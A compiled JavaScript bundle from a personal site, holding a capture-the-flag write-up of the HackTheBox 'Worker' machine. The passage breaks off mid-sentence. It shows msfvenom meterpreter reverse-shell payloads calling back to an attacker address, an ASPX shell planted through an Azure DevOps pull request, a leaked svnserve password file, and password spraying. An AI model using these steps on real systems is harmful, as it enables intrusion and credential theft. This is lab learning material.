"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3704],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>u});var s=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);n&&(s=s.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,s)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,s,r=function(e,n){if(null==e)return{};var t,s,r={},o=Object.keys(e);for(s=0;s<o.length;s++)t=o[s],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(s=0;s<o.length;s++)t=o[s],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=s.createContext({}),p=function(e){var n=s.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},c=function(e){var n=p(e.components);return s.createElement(l.Provider,{value:n},e.children)},d="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return s.createElement(s.Fragment,{},n)}},h=s.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),d=p(t),h=r,u=d["".concat(l,".").concat(h)]||d[h]||m[h]||o;return t?s.createElement(u,a(a({ref:n},c),{},{components:t})):s.createElement(u,a({ref:n},c))}));function u(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,a=new Array(o);a[0]=h;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[d]="string"==typeof e?e:r,a[1]=i;for(var p=2;p<o;p++)a[p]=t[p];return s.createElement.apply(null,a)}return s.createElement.apply(null,t)}h.displayName="MDXCreateElement"},23604:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>m,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var s=t(87462),r=(t(67294),t(3905));const o={layout:"post",title:"Worker ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","windows","pe","svn","azure","devops"],date:"2021/01/31 17:50:00",thumbnail:"/img/HackTheBox/worker.png",toc:!0},a="Information",i={unversionedId:"HackTheBox/Worker/write-up",id:"HackTheBox/Worker/write-up",title:"Worker ",description:"- Name: Worker",source:"@site/writeups/HackTheBox/Worker/write-up.md",sourceDirName:"HackTheBox/Worker",slug:"/HackTheBox/Worker/write-up",permalink:"/writeups/HackTheBox/Worker/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"svn",permalink:"/writeups/tags/svn"},{label:"azure",permalink:"/writeups/tags/azure"},{label:"devops",permalink:"/writeups/tags/devops"}],version:"current",frontMatter:{layout:"post",title:"Worker ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","windows","pe","svn","azure","devops"],date:"2021/01/31 17:50:00",thumbnail:"/img/HackTheBox/worker.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Traverxec ",permalink:"/writeups/HackTheBox/Traverxec/write-up"},next:{title:"0day",permalink:"/writeups/Tryhackme/0day/"}},l={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP enumeration",id:"http-enumeration",level:2},{value:"SVN",id:"svn",level:2},{value:"Exploiting Azure DevOps",id:"exploiting-azure-devops",level:2},{value:"Privilege Escalation of Machine : from iis apppooldefaultapppool to robisl",id:"privilege-escalation-of-machine--from-iis-apppooldefaultapppool-to-robisl",level:2},{value:"Privilege Escalation of Machine : from robisl to Administrator",id:"privilege-escalation-of-machine--from-robisl-to-administrator",level:2}],c={toc:p},d="wrapper";function m(e){let{components:n,...o}=e;return(0,r.kt)(d,(0,s.Z)({},c,o,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Worker"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/270"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Windows"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Worker",src:t(67563).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pacman -S nmap man ffuf subversion lynx metasploit crackmapexec evil-winrm\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Let's run a ","[nmap][nmap]"," scan to find port and services:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Tue Oct 20 20:33:43 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.203\nNmap scan report for 10.10.10.203\nHost is up (0.023s latency).\nNot shown: 65532 filtered ports\nPORT     STATE SERVICE  VERSION\n80/tcp   open  http     Microsoft IIS httpd 10.0\n| http-methods:\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n3690/tcp open  svnserve Subversion\n5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Oct 20 20:35:39 2020 -- 1 IP address (1 host up) scanned in 115.81 seconds\n")),(0,r.kt)("p",null,"And add the local domain to our hosts file."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep worker\n10.10.10.203 worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb\n")),(0,r.kt)("h2",{id:"http-enumeration"},"HTTP enumeration"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://worker.htb/"},"http://worker.htb/")," is displaying the default IIS home page, but enumeration\nwith ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf")," gives nothing."),(0,r.kt)("h2",{id:"svn"},"SVN"),(0,r.kt)("p",null,"On port 3690 we have a SVN server. 3690 is the default port for\n",(0,r.kt)("a",{parentName:"p",href:"http://svnbook.red-bean.com/en/1.8/svn.ref.svnserve.re.html"},"svnserve")," service."),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"svnserve allows access to Subversion repositories using Subversion's custom network protocol."),(0,r.kt)("p",{parentName:"blockquote"},"You can run svnserve as a standalone server process (for clients that are using the svn:// access method); you can have a daemon such as inetd or xinetd launch it for you on demand (also for svn://), or you can have sshd launch it on demand for the svn+ssh:// access method.")),(0,r.kt)("p",null,"So let's find some information:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ svn info svn://worker.htb\nPath: .\nURL: svn://worker.htb\nRelative URL: ^/\nRepository Root: svn://worker.htb\nRepository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1\nRevision: 5\nNode Kind: directory\nLast Changed Author: nathen\nLast Changed Rev: 5\nLast Changed Date: 2020-06-20 15:52:00 +0200 (Sat, 20 Jun 2020)\n")),(0,r.kt)("p",null,"Let's use the command to ",(0,r.kt)("a",{parentName:"p",href:"http://svnbook.red-bean.com/en/1.8/svn.ref.svn.c.list.html"},"list directory entries in the repository"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ svn list svn://worker.htb\ndimension.worker.htb/\nmoved.tx\n")),(0,r.kt)("p",null,"Let's ",(0,r.kt)("a",{parentName:"p",href:"http://svnbook.red-bean.com/en/1.8/svn.ref.svn.c.export.html"},"export a clean directory tree from the repository specified by URL"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ mkdir svn && cd svn && svn export --force svn://worker.htb\nA    .\nA    dimension.worker.htb\nA    dimension.worker.htb/LICENSE.txt\nA    dimension.worker.htb/README.txt\nA    dimension.worker.htb/assets\nA    dimension.worker.htb/assets/css\nA    dimension.worker.htb/assets/css/fontawesome-all.min.css\nA    dimension.worker.htb/assets/css/main.css\nA    dimension.worker.htb/assets/css/noscript.css\nA    dimension.worker.htb/assets/js\nA    dimension.worker.htb/assets/js/breakpoints.min.js\nA    dimension.worker.htb/assets/js/browser.min.js\nA    dimension.worker.htb/assets/js/jquery.min.js\nA    dimension.worker.htb/assets/js/main.js\nA    dimension.worker.htb/assets/js/util.js\nA    dimension.worker.htb/assets/sass\nA    dimension.worker.htb/assets/sass/base\nA    dimension.worker.htb/assets/sass/base/_page.scss\nA    dimension.worker.htb/assets/sass/base/_reset.scss\nA    dimension.worker.htb/assets/sass/base/_typography.scss\nA    dimension.worker.htb/assets/sass/components\nA    dimension.worker.htb/assets/sass/components/_actions.scss\nA    dimension.worker.htb/assets/sass/components/_box.scss\nA    dimension.worker.htb/assets/sass/components/_button.scss\nA    dimension.worker.htb/assets/sass/components/_form.scss\nA    dimension.worker.htb/assets/sass/components/_icon.scss\nA    dimension.worker.htb/assets/sass/components/_icons.scss\nA    dimension.worker.htb/assets/sass/components/_image.scss\nA    dimension.worker.htb/assets/sass/components/_list.scss\nA    dimension.worker.htb/assets/sass/components/_table.scss\nA    dimension.worker.htb/assets/sass/layout\nA    dimension.worker.htb/assets/sass/layout/_bg.scss\nA    dimension.worker.htb/assets/sass/layout/_footer.scss\nA    dimension.worker.htb/assets/sass/layout/_header.scss\nA    dimension.worker.htb/assets/sass/layout/_main.scss\nA    dimension.worker.htb/assets/sass/layout/_wrapper.scss\nA    dimension.worker.htb/assets/sass/libs\nA    dimension.worker.htb/assets/sass/libs/_breakpoints.scss\nA    dimension.worker.htb/assets/sass/libs/_functions.scss\nA    dimension.worker.htb/assets/sass/libs/_mixins.scss\nA    dimension.worker.htb/assets/sass/libs/_vars.scss\nA    dimension.worker.htb/assets/sass/libs/_vendor.scss\nA    dimension.worker.htb/assets/sass/main.scss\nA    dimension.worker.htb/assets/sass/noscript.scss\nA    dimension.worker.htb/assets/webfonts\nA    dimension.worker.htb/assets/webfonts/fa-brands-400.eot\nA    dimension.worker.htb/assets/webfonts/fa-brands-400.svg\nA    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf\nA    dimension.worker.htb/assets/webfonts/fa-brands-400.woff\nA    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2\nA    dimension.worker.htb/assets/webfonts/fa-regular-400.eot\nA    dimension.worker.htb/assets/webfonts/fa-regular-400.svg\nA    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf\nA    dimension.worker.htb/assets/webfonts/fa-regular-400.woff\nA    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2\nA    dimension.worker.htb/assets/webfonts/fa-solid-900.eot\nA    dimension.worker.htb/assets/webfonts/fa-solid-900.svg\nA    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf\nA    dimension.worker.htb/assets/webfonts/fa-solid-900.woff\nA    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2\nA    dimension.worker.htb/images\nA    dimension.worker.htb/images/bg.jpg\nA    dimension.worker.htb/images/overlay.png\nA    dimension.worker.htb/images/pic01.jpg\nA    dimension.worker.htb/images/pic02.jpg\nA    dimension.worker.htb/images/pic03.jpg\nA    dimension.worker.htb/index.html\nA    moved.txt\nExported revision 5.\n")),(0,r.kt)("p",null,"Let's see the first one, which is explicit:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat moved.txt\nThis repository has been migrated and will no longer be maintained here.\nYou can find the latest version at: http://devops.worker.htb\n\n// The Worker team :)\n")),(0,r.kt)("p",null,"On the other repository we can find a showcase website that is listing some\nprojects and that can give us new sub-domains:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ lynx -dump -listonly -nonumbers dimension.worker.htb/index.html | grep http\nhttp://alpha.worker.htb/\nhttp://cartoon.worker.htb/\nhttp://lens.worker.htb/\nhttp://solid-state.worker.htb/\nhttp://spectral.worker.htb/\nhttp://story.worker.htb/\nhttps://html5up.net/\n")),(0,r.kt)("p",null,"If we go at ",(0,r.kt)("a",{parentName:"p",href:"http://devops.worker.htb"},"http://devops.worker.htb")," it ask some credentials for basic auth.\nBut we have none yet."),(0,r.kt)("p",null,"But we saw earlier there was 5 revisions so there may be information in a\nprevious revision."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ svn list -r 3 svn://worker.htb\ndeploy.ps1\ndimension.worker.htb/\n")),(0,r.kt)("p",null,"Cool, we have found a powershell script."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ svn checkout -r 3 svn://worker.htb\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"deploy.ps1")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},'$user = "nathen"\n# NOTE: We cant have my password here!!!\n$plain = ""\n$pwd = ($plain | ConvertTo-SecureString)\n$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd\n$args = "Copy-Site.ps1"\nStart-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")\n')),(0,r.kt)("p",null,"No password here, let's check another revision:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ svn checkout -r 2 svn://worker.htb\nU    deploy.ps1\nChecked out revision 2.\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"deploy.ps1")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},'$user = "nathen"\n$plain = "wendel98"\n$pwd = ($plain | ConvertTo-SecureString)\n$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd\n$args = "Copy-Site.ps1"\nStart-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")\n')),(0,r.kt)("p",null,"This time the password is here. We can connect with those credentials to\n",(0,r.kt)("a",{parentName:"p",href:"http://devops.worker.htb/"},"http://devops.worker.htb/"),"."),(0,r.kt)("h2",{id:"exploiting-azure-devops"},"Exploiting Azure DevOps"),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/Y9qf4pD.png",alt:null})),(0,r.kt)("p",null,"We have access to a repository ",(0,r.kt)("a",{parentName:"p",href:"http://devops.worker.htb/ekenas/SmartHotel360"},"http://devops.worker.htb/ekenas/SmartHotel360")),(0,r.kt)("p",null,"Look at the different projects we have access to:"),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/g1vieWd.png",alt:null})),(0,r.kt)("p",null,"A lot of them are matching the sub-domains we found earlier"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"alpha.worker.htb\ncartoon.worker.htb\nlens.worker.htb\nsolid-state.worker.htb\nspectral.worker.htb\nstory.worker.htb\n")),(0,r.kt)("p",null,"All those domains are hosting a web application and we can control the source,\nso we'll be able to upload a reverse shell to the master branch and access it\nwia the web application."),(0,r.kt)("p",null,"First, let's generate an ASPX reverse shell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f aspx > cyfun.aspx\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of generic/none\ngeneric/none succeeded with size 510 (iteration=0)\ngeneric/none chosen with final size 510\nPayload size: 510 bytes\nFinal size of aspx file: 3663 bytes\n")),(0,r.kt)("p",null,"Here a few steps I won't details too much."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Select a project, eg. Alpha"),(0,r.kt)("li",{parentName:"ol"},"Create a new branch"),(0,r.kt)("li",{parentName:"ol"},"Upload the reverse shell to the branch (eg. in assets folder)"),(0,r.kt)("li",{parentName:"ol"},"Create a PR"),(0,r.kt)("li",{parentName:"ol"},"Match merge policies: approve and link a work item"),(0,r.kt)("li",{parentName:"ol"},"Complete the PR (merge)")),(0,r.kt)("p",null,"Start a listener:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"msf5 exploit(multi/handler) > options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.14.174     yes       The listen address (an interface may be specified)\n   LPORT     9999             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nmsf5 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.14.174:9999\n[*] Sending stage (201283 bytes) to 10.10.10.203\n[*] Meterpreter session 1 opened (10.10.14.174:9999 -> 10.10.10.203:55557) at 2020-10-21 20:33:24 +0200\n\nmeterpreter >\n")),(0,r.kt)("p",null,"Access the reverse shell & enjoy the meterpreter ",(0,r.kt)("a",{parentName:"p",href:"http://alpha.worker.htb/assets/cyfun.aspx"},"http://alpha.worker.htb/assets/cyfun.aspx")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-iis-apppooldefaultapppool-to-robisl"},"Privilege Escalation of Machine : from iis apppool\\defaultapppool to robisl"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"meterpreter > shell\nProcess 8920 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.1282]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nc:\\windows\\system32\\inetsrv>whoami\niis apppool\\defaultapppool\n")),(0,r.kt)("p",null,"Let's ",(0,r.kt)("a",{parentName:"p",href:"https://superuser.com/questions/139899/see-available-drives-from-windows-cli"},"list the available drives"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"c:\\windows\\system32\\inetsrv>wmic logicaldisk get volumename,name,caption\nCaption  Name  VolumeName\nC:       C:\nW:       W:    Work\n\nc:\\windows\\system32\\inetsrv>fsutil fsinfo drives\n\nDrives: C:\\ W:\\\n")),(0,r.kt)("p",null,"We have an unusual drive with label W:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"c:\\windows\\system32\\inetsrv>ls w:\\\nAzureDevOpsData\nSystem Volume Information\nagents\nsites\nsvnrepos\n")),(0,r.kt)("p",null,"Using a ",(0,r.kt)("a",{parentName:"p",href:"https://guif.re/windowseop#pe%203:%20ClearText%20passwords%20(quick%20hits)"},"Guifre")," technique to quickly loot password I found a promising file:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"c:\\windows\\system32\\inetsrv>dir w:\\ /s /b | findstr /si pass*\n...\nw:\\svnrepos\\www\\conf\\passwd\n\nc:\\windows\\system32\\inetsrv>cat w:\\svnrepos\\www\\conf\\passwd\n### This file is an example password file for svnserve.\n### Its format is similar to that of svnserve.conf. As shown in the\n### example below it contains one section labelled [users].\n### The name and password for each user follow, one account per line.\n\n[users]\nnathen = wendel98\nnichin = fqerfqerf\nnichin = asifhiefh\nnoahip = player\nnuahip = wkjdnw\noakhol = bxwdjhcue\nowehol = supersecret\npaihol = painfulcode\nparhol = gitcommit\npathop = iliketomoveit\npauhor = nowayjose\npayhos = icanjive\nperhou = elvisisalive\npeyhou = ineedvacation\nphihou = pokemon\nquehub = pickme\nquihud = kindasecure\nrachul = guesswho\nraehun = idontknow\nramhun = thisis\nranhut = getting\nrebhyd = rediculous\nreeinc = iagree\nreeing = tosomepoint\nreiing = isthisenough\nrenipr = dummy\nrhiire = users\nriairv = canyou\nricisa = seewhich\nrobish = onesare\nrobisl = wolves11\nrobive = andwhich\nronkay = onesare\nrubkei = the\nrupkel = sheeps\nryakel = imtired\nsabken = drjones\nsamken = aqua\nsapket = hamburger\nsarkil = friday\n")),(0,r.kt)("p",null,"Wow tons of creds."),(0,r.kt)("p",null,"Let's put username and password in files."),(0,r.kt)("p",null,"I'll use ","[crackmaexec][cme]"," for password spraying."),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"--no-bruteforce - No spray when using file for username and password (user1 => password1, user2 => password2"),(0,r.kt)("p",{parentName:"blockquote"},"  --continue-on-success - continues authentication attempts even after successes")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cme winrm 10.10.10.203 --no-bruteforce -u usernames.txt -p passwords.txt --continue-on-success\nWINRM       10.10.10.203    5985   NONE             [*] None (name:10.10.10.203) (domain:None)\nWINRM       10.10.10.203    5985   NONE             [*] http://10.10.10.203:5985/wsman\nWINRM       10.10.10.203    5985   NONE             [-] None\\nathen:wendel98\nWINRM       10.10.10.203    5985   NONE             [-] None\\nichin:fqerfqerf\nWINRM       10.10.10.203    5985   NONE             [-] None\\nichin:asifhiefh\nWINRM       10.10.10.203    5985   NONE             [-] None\\noahip:player\nWINRM       10.10.10.203    5985   NONE             [-] None\\nuahip:wkjdnw\nWINRM       10.10.10.203    5985   NONE             [-] None\\oakhol:bxwdjhcue\nWINRM       10.10.10.203    5985   NONE             [-] None\\owehol:supersecret\nWINRM       10.10.10.203    5985   NONE             [-] None\\paihol:painfulcode\nWINRM       10.10.10.203    5985   NONE             [-] None\\parhol:gitcommit\nWINRM       10.10.10.203    5985   NONE             [-] None\\pathop:iliketomoveit\nWINRM       10.10.10.203    5985   NONE             [-] None\\pauhor:nowayjose\nWINRM       10.10.10.203    5985   NONE             [-] None\\payhos:icanjive\nWINRM       10.10.10.203    5985   NONE             [-] None\\perhou:elvisisalive\nWINRM       10.10.10.203    5985   NONE             [-] None\\peyhou:ineedvacation\nWINRM       10.10.10.203    5985   NONE             [-] None\\phihou:pokemon\nWINRM       10.10.10.203    5985   NONE             [-] None\\quehub:pickme\nWINRM       10.10.10.203    5985   NONE             [-] None\\quihud:kindasecure\nWINRM       10.10.10.203    5985   NONE             [-] None\\rachul:guesswho\nWINRM       10.10.10.203    5985   NONE             [-] None\\raehun:idontknow\nWINRM       10.10.10.203    5985   NONE             [-] None\\ramhun:thisis\nWINRM       10.10.10.203    5985   NONE             [-] None\\ranhut:getting\nWINRM       10.10.10.203    5985   NONE             [-] None\\rebhyd:rediculous\nWINRM       10.10.10.203    5985   NONE             [-] None\\reeinc:iagree\nWINRM       10.10.10.203    5985   NONE             [-] None\\reeing:tosomepoint\nWINRM       10.10.10.203    5985   NONE             [-] None\\reiing:isthisenough\nWINRM       10.10.10.203    5985   NONE             [-] None\\renipr:dummy\nWINRM       10.10.10.203    5985   NONE             [-] None\\rhiire:users\nWINRM       10.10.10.203    5985   NONE             [-] None\\riairv:canyou\nWINRM       10.10.10.203    5985   NONE             [-] None\\ricisa:seewhich\nWINRM       10.10.10.203    5985   NONE             [-] None\\robish:onesare\nWINRM       10.10.10.203    5985   NONE             [+] None\\robisl:wolves11 (Pwn3d!)\nWINRM       10.10.10.203    5985   NONE             [-] None\\robive:andwhich\nWINRM       10.10.10.203    5985   NONE             [-] None\\ronkay:onesare\nWINRM       10.10.10.203    5985   NONE             [-] None\\rubkei:the\nWINRM       10.10.10.203    5985   NONE             [-] None\\rupkel:sheeps\nWINRM       10.10.10.203    5985   NONE             [-] None\\ryakel:imtired\nWINRM       10.10.10.203    5985   NONE             [-] None\\sabken:drjones\nWINRM       10.10.10.203    5985   NONE             [-] None\\samken:aqua\nWINRM       10.10.10.203    5985   NONE             [-] None\\sapket:hamburger\nWINRM       10.10.10.203    5985   NONE             [-] None\\sarkil:friday\n")),(0,r.kt)("p",null,"So we have only one set of valid credentials: ",(0,r.kt)("inlineCode",{parentName:"p"},"robisl:wolves11"),"."),(0,r.kt)("p",null,"Now let's connect with ","[evil-winrm][evil-winrm]",":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ evil-winrm -u robisl -p wolves11 -i 10.10.10.203\n\nEvil-WinRM shell v2.3\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\robisl\\Documents> cd ..\n*Evil-WinRM* PS C:\\Users\\robisl> gc Desktop/user.txt\n571ead91c15070e615b5882f25bad03d\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-robisl-to-administrator"},"Privilege Escalation of Machine : from robisl to Administrator"),(0,r.kt)("p",null,"We can enumerate a bit but there is nothing more we can see with robisl than\nwe were able to see with the IIS account."),(0,r.kt)("p",null,"So lets go back to ",(0,r.kt)("a",{parentName:"p",href:"http://devops.worker.htb"},"http://devops.worker.htb"),", sign out and sign in back as\nrobisl."),(0,r.kt)("p",null,"Now we can see a different project than earlier:\n",(0,r.kt)("a",{parentName:"p",href:"http://devops.worker.htb/ekenas/PartsUnlimited"},"http://devops.worker.htb/ekenas/PartsUnlimited")),(0,r.kt)("p",null,"This time we don't have a PartsUnlimited sub-domain, there is a lot of files in\nthe repository but nothing seems useful."),(0,r.kt)("p",null,"As an everyday user of GitLab I know I can run some tests in a docker thanks\nto the integrated GitLab CI pipeline (no need to configure an external CI) that\nyo ucan configure through ",(0,r.kt)("inlineCode",{parentName:"p"},".gitlab-ci.yml"),"."),(0,r.kt)("p",null,"It seems Azure Devops has a similar feature: New Pipeline > Azure Repos Git > PartsUnlimited > Starter Pipeline > ",(0,r.kt)("inlineCode",{parentName:"p"},"azure-pipelines.yml"),"."),(0,r.kt)("p",null,"We are welcomed with a default template:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-yaml"},"# Starter pipeline\n# Start with a minimal pipeline that you can customize to build and deploy your code.\n# Add steps that build, run tests, deploy, and more:\n# https://aka.ms/yaml\n\ntrigger:\n- master\n\npool: 'Default'\n\nsteps:\n- script: echo Hello, world!\n  displayName: 'Run a one-line script'\n\n- script: |\n    echo Add other tasks to build, test, and deploy your project.\n    echo See https://aka.ms/yaml\n  displayName: 'Run a multi-line script'\n")),(0,r.kt)("p",null,"Let's create a new reverse shell (an exe this time)."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f raw > cyfun.exe\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of generic/none\ngeneric/none succeeded with size 510 (iteration=0)\ngeneric/none chosen with final size 510\nPayload size: 510 bytes\n")),(0,r.kt)("p",null,"Start a listener aagain:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"msf5 exploit(multi/handler) > options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.14.174     yes       The listen address (an interface may be specified)\n   LPORT     9999             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n")),(0,r.kt)("p",null,"[evil-winrm][evil-winrm]"," allows us to upload a file:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"*Evil-WinRM* PS C:\\Users\\robisl\\Downloads> upload /home/cyfun/CTF/HackTheBox/machines/Worker/cyfun.exe\nInfo: Uploading /home/cyfun/CTF/HackTheBox/machines/Worker/cyfun.exe to C:\\Users\\robisl\\Downloads\\cyfun.exe\n\n\nData: 680 bytes of 680 bytes copied\n\nInfo: Upload successful!\n\n*Evil-WinRM* PS C:\\Users\\robisl\\Downloads> pwd\n\nPath\n----\nC:\\Users\\robisl\\Downloads\n")),(0,r.kt)("p",null,"Now modify the template pipelien to"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-yaml"},"# Starter pipeline\n# Start with a minimal pipeline that you can customize to build and deploy your code.\n# Add steps that build, run tests, deploy, and more:\n# https://aka.ms/yaml\n\ntrigger:\n- master\n\npool: 'Default'\n\nsteps:\n- script: C:\\Users\\robisl\\Downloads\\cyfun.exe\n  displayName: 'cyfun'\n")),(0,r.kt)("p",null,"Then save and run to a new branch and PR to master."),(0,r.kt)("p",null,"When the pipeline ran I got an error:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"The pipeline is not valid. Could not find a pool 